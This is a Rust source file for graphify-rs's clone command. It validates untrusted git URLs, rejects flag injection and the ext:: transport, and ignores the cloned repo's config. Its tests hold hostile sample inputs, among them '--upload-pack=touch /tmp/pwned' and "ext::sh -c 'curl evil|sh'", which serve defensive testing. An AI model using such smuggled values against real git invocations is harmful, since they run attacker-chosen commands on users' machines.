//! Clone command: clone a repository and build its graph in one step.

use anyhow::{Context, Result, bail};
use colored::Colorize;
use std::io::{IsTerminal, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// How much of git's stderr is kept for the failure message. Git's progress
/// output is unbounded on a large repo, and only the tail carries the reason
/// the clone died.
const STDERR_TAIL_BYTES: usize = 8 * 1024;

/// How many trailing lines of git's stderr are quoted back on failure. The
/// stream was already echoed live, so the error only needs the diagnosis.
const STDERR_TAIL_LINES: usize = 10;

/// Clone `url` into `dest` (defaulting to the repository name) and, unless
/// `no_build` is set, build the graph for the checkout.
pub async fn cmd_clone(url: &str, dest: Option<&str>, no_build: bool) -> Result<()> {
    let url = validate_url(url)?;

    let dest = match dest {
        Some(d) => PathBuf::from(d),
        None => PathBuf::from(repo_name_from_url(url)?),
    };
    ensure_clonable(&dest)?;

    println!(
        "  {} {} → {}",
        "Cloning".cyan(),
        url,
        dest.display().to_string().bold()
    );
    run_git_clone(url, &dest)?;
    println!("  {} Cloned into {}", "✓".green(), dest.display());

    if no_build {
        println!(
            "  {} Skipping build (--no-build). Run `graphify-rs build --path {}` when ready.",
            "ℹ".blue(),
            dest.display()
        );
        return Ok(());
    }

    build_fresh_checkout(&dest).await
}

/// Reject URLs git would mistake for a flag, and hand back the trimmed form so
/// every later step (name derivation, the subprocess arg) sees one spelling.
///
/// `url` is untrusted: it arrives straight from argv and can be pasted from
/// anywhere. The clone itself is invoked with an argument vector and a `--`
/// terminator, so this check is a second line of defence rather than the only
/// one — but it also turns a confusing git error into a clear one.
fn validate_url(url: &str) -> Result<&str> {
    let url = url.trim();
    if url.is_empty() {
        bail!("repository URL is empty");
    }
    if url.starts_with('-') {
        bail!("refusing repository URL '{url}': a leading '-' would be read by git as a flag");
    }
    // `ext::` is not a transport, it is "run this command and speak the git
    // protocol over its pipes". Git allows it from the command line by default
    // (`protocol.ext.allow=user`), so a URL pasted from an issue tracker would
    // execute. Nothing about `graphify-rs clone` needs it.
    if url.len() >= 5 && url[..5].eq_ignore_ascii_case("ext::") {
        bail!("refusing repository URL '{url}': the ext:: transport runs an arbitrary command");
    }
    Ok(url)
}

/// Derive the directory `git clone` would create for `url`.
///
/// Mirrors git's own `guess_dir_name`: drop the `.git` suffix and trailing
/// slashes, then take the last path component. The one thing worth spelling
/// out is the scheme/authority split — without it a bare `https://host/` would
/// yield the *hostname* as a directory name, which is a confusing way to
/// discover that the URL was incomplete.
fn repo_name_from_url(url: &str) -> Result<String> {
    // Trailing slashes are cosmetic, and `.git` is a suffix on the repository
    // rather than part of its name. Strip slashes on both sides of the `.git`
    // removal so `…/repo.git/` and `…/repo/.git` both reduce cleanly.
    let trimmed = url.trim_end_matches('/');
    let trimmed = trimmed.strip_suffix(".git").unwrap_or(trimmed);
    let trimmed = trimmed.trim_end_matches('/');

    let path = if let Some((_scheme, rest)) = trimmed.split_once("://") {
        // `scheme://authority/path` — the authority is never the repo name.
        rest.split_once('/').map_or("", |(_authority, path)| path)
    } else if let Some((_host, rest)) = trimmed.split_once(':') {
        // SSH shorthand (`git@host:org/repo`, or `git@host:repo` at the root),
        // and incidentally Windows drive letters (`C:\src\repo`).
        rest
    } else {
        // A plain local path.
        trimmed
    };

    let name = path.rsplit(['/', '\\']).next().unwrap_or_default();
    if name.is_empty() || name == "." || name == ".." {
        bail!("cannot derive a directory name from '{url}' — pass an explicit destination");
    }
    Ok(name.to_string())
}

/// Refuse to clone on top of anything that already holds files.
///
/// Git would refuse too, but only after contacting the remote; failing here
/// keeps a typo'd destination from looking like a network problem.
fn ensure_clonable(dest: &Path) -> Result<()> {
    if dest.is_file() {
        bail!(
            "destination {} is a file — pass a directory path instead",
            dest.display()
        );
    }
    match std::fs::read_dir(dest) {
        Ok(mut entries) => {
            if entries.next().is_some() {
                bail!(
                    "destination {} already exists and is not empty — remove it or pass a different destination",
                    dest.display()
                );
            }
            Ok(())
        }
        // Nothing there yet is the happy path; git creates the directory.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e).with_context(|| format!("cannot inspect destination {}", dest.display())),
    }
}

/// Run `git clone`, echoing git's progress as it happens.
///
/// Git writes progress to stderr, so that stream is teed rather than inherited:
/// the bytes reach the terminal immediately (a clone of a large repo would
/// otherwise look hung) while the tail is retained so a failure can quote
/// git's own message instead of a bare exit code.
fn run_git_clone(url: &str, dest: &Path) -> Result<()> {
    let mut cmd = Command::new("git");
    cmd.arg("clone");
    // Git turns progress off when stderr is a pipe, which it always is here.
    // Ask for it back only when a human is watching — in a log file the `\r`
    // redraw frames are pure noise.
    if std::io::stderr().is_terminal() {
        cmd.arg("--progress");
    }
    let mut child = cmd
        // Everything after `--` is a path/URL, never a flag.
        .arg("--")
        .arg(url)
        .arg(dest)
        .stdout(Stdio::inherit())
        .stderr(Stdio::piped())
        .spawn()
        .context("failed to run `git` — is it installed and on PATH?")?;

    let mut tail = Vec::new();
    if let Some(mut stream) = child.stderr.take() {
        // Read raw bytes rather than lines: git redraws progress with `\r`, and
        // line buffering would hold the whole clone back to a single burst.
        let mut buf = [0u8; 4096];
        let mut sink = std::io::stderr();
        loop {
            let n = match stream.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => n,
                // A signal can interrupt a pipe read; the clone is still going.
                Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(_) => break,
            };
            let _ = sink.write_all(&buf[..n]);
            let _ = sink.flush();
            tail.extend_from_slice(&buf[..n]);
            if tail.len() > STDERR_TAIL_BYTES {
                tail.drain(..tail.len() - STDERR_TAIL_BYTES);
            }
        }
    }

    let status = child.wait().context("failed to wait for `git clone`")?;
    if !status.success() {
        let detail = stderr_tail(&tail);
        if detail.is_empty() {
            bail!("git clone failed ({status})");
        }
        bail!("git clone failed ({status}):\n{detail}");
    }
    Ok(())
}

/// Condense captured git stderr into the last few meaningful lines.
///
/// Progress redraws are separated by `\r`, so splitting on both terminators
/// drops the intermediate frames and keeps the messages worth reporting.
fn stderr_tail(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    let lines: Vec<&str> = text
        .split(['\r', '\n'])
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    let start = lines.len().saturating_sub(STDERR_TAIL_LINES);
    lines[start..].join("\n")
}

/// Build the graph for a checkout that was just created.
///
/// Deliberately does not read the cloned repository's `graphify-rs.toml`: the
/// code arrived seconds ago from an arbitrary remote, and its config could
/// redirect the output directory or point semantic extraction at an LLM
/// endpoint of the repo author's choosing. Plain defaults keep `clone` from
/// handing a stranger's file control over the build. Anyone who wants the
/// repo's own settings can run `build` in it afterwards.
async fn build_fresh_checkout(dest: &Path) -> Result<()> {
    let output = crate::paths::resolve_default_output(dest);
    let dest_str = dest.to_string_lossy().into_owned();
    let output_str = output.to_string_lossy().into_owned();

    println!("\n  {} graph for {}...", "Building".cyan(), dest.display());
    crate::cmd_build::cmd_build(
        &dest_str,
        &output_str,
        false, // no_llm: semantic extraction degrades to a hint without config
        false, // code_only
        &[],   // formats: cmd_build's default (json + report)
        crate::Verbosity::Normal,
        None,  // jobs: rayon decides
        None,  // max_viz_nodes
        None,  // llm_config: see the note above on the cloned repo's config
        false, // no_viz
        false, // cluster_only
        false, // deep
        None,  // neo4j_conn
        None,  // media_model
    )
    .await
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn derives_name_from_https_url() {
        assert_eq!(
            repo_name_from_url("https://github.com/org/repo").unwrap(),
            "repo"
        );
    }

    #[test]
    fn strips_trailing_git_suffix() {
        assert_eq!(
            repo_name_from_url("https://github.com/org/repo.git").unwrap(),
            "repo"
        );
    }

    #[test]
    fn strips_trailing_slash() {
        assert_eq!(
            repo_name_from_url("https://github.com/org/repo/").unwrap(),
            "repo"
        );
        assert_eq!(
            repo_name_from_url("https://github.com/org/repo.git/").unwrap(),
            "repo"
        );
        assert_eq!(
            repo_name_from_url("https://github.com/org/repo/.git").unwrap(),
            "repo"
        );
    }

    #[test]
    fn derives_name_from_ssh_shorthand() {
        assert_eq!(
            repo_name_from_url("git@github.com:org/repo.git").unwrap(),
            "repo"
        );
        assert_eq!(
            repo_name_from_url("git@github.com:org/repo").unwrap(),
            "repo"
        );
        // Repo at the host root: no `/` follows the colon.
        assert_eq!(
            repo_name_from_url("git@github.com:repo.git").unwrap(),
            "repo"
        );
    }

    #[test]
    fn derives_name_from_ssh_url_with_port() {
        assert_eq!(
            repo_name_from_url("ssh://git@example.com:2222/org/repo.git").unwrap(),
            "repo"
        );
    }

    #[test]
    fn derives_name_from_local_and_file_paths() {
        assert_eq!(repo_name_from_url("/srv/git/repo.git").unwrap(), "repo");
        assert_eq!(
            repo_name_from_url("file:///srv/git/repo.git").unwrap(),
            "repo"
        );
        assert_eq!(repo_name_from_url("../sibling/repo/").unwrap(), "repo");
        assert_eq!(repo_name_from_url(r"C:\src\repo").unwrap(), "repo");
    }

    #[test]
    fn rejects_urls_with_no_derivable_name() {
        // A bare host must not become a directory called "github.com".
        for url in [
            "https://github.com/",
            "https://github.com",
            "git@github.com:",
            "/",
            ".git",
        ] {
            assert!(
                repo_name_from_url(url).is_err(),
                "expected {url:?} to have no derivable name"
            );
        }
    }

    #[test]
    fn matches_git_on_a_trailing_dot_git_component() {
        // `git clone https://host/org/.git` checks out into `org`; stay aligned.
        assert_eq!(
            repo_name_from_url("https://github.com/org/.git").unwrap(),
            "org"
        );
    }

    #[test]
    fn rejects_dot_directory_names() {
        assert!(repo_name_from_url("https://github.com/org/.").is_err());
        assert!(repo_name_from_url("https://github.com/org/..").is_err());
    }

    #[test]
    fn rejects_leading_dash_urls() {
        for url in [
            "-u",
            "--upload-pack=touch /tmp/pwned",
            "--config=core.pager=sh",
        ] {
            let err = validate_url(url).unwrap_err().to_string();
            assert!(
                err.contains("leading '-'"),
                "expected a flag-injection refusal for {url:?}, got: {err}"
            );
        }
        // Whitespace must not smuggle a dash past the check.
        assert!(validate_url("  --upload-pack=x  ").is_err());
    }

    #[test]
    fn rejects_the_ext_transport() {
        for url in ["ext::sh -c 'curl evil|sh'", "EXT::whoami"] {
            let err = validate_url(url).unwrap_err().to_string();
            assert!(
                err.contains("arbitrary command"),
                "expected an ext:: refusal for {url:?}, got: {err}"
            );
        }
        // A repository that merely starts with those letters is fine.
        assert!(validate_url("https://github.com/org/extra.git").is_ok());
        assert!(validate_url("ext").is_ok());
    }

    #[test]
    fn rejects_empty_url() {
        assert!(validate_url("").is_err());
        assert!(validate_url("   ").is_err());
    }

    #[test]
    fn accepts_ordinary_urls_and_trims_them() {
        assert_eq!(
            validate_url("  https://github.com/org/repo.git  ").unwrap(),
            "https://github.com/org/repo.git"
        );
    }

    #[test]
    fn refuses_non_empty_destination() {
        let tmp = tempfile::tempdir().unwrap();
        let dest = tmp.path().join("occupied");
        std::fs::create_dir(&dest).unwrap();
        std::fs::write(dest.join("README.md"), "hi").unwrap();

        let err = ensure_clonable(&dest).unwrap_err().to_string();
        assert!(err.contains("not empty"), "unexpected error: {err}");
    }

    #[test]
    fn allows_missing_or_empty_destination() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(ensure_clonable(&tmp.path().join("fresh")).is_ok());

        let empty = tmp.path().join("empty");
        std::fs::create_dir(&empty).unwrap();
        assert!(ensure_clonable(&empty).is_ok());
    }

    #[test]
    fn refuses_destination_that_is_a_file() {
        let tmp = tempfile::tempdir().unwrap();
        let file = tmp.path().join("not-a-dir");
        std::fs::write(&file, "x").unwrap();

        let err = ensure_clonable(&file).unwrap_err().to_string();
        assert!(err.contains("is a file"), "unexpected error: {err}");
    }

    #[test]
    fn stderr_tail_drops_progress_frames() {
        let raw = b"Cloning into 'repo'...\rReceiving objects:  10%\rReceiving objects: 100%\nfatal: repository not found\n";
        let tail = stderr_tail(raw);
        assert!(tail.ends_with("fatal: repository not found"));
        assert!(!tail.contains('\r'));
    }

    #[test]
    fn stderr_tail_is_empty_for_silence() {
        assert_eq!(stderr_tail(b""), "");
        assert_eq!(stderr_tail(b"\r\n  \n"), "");
    }
}
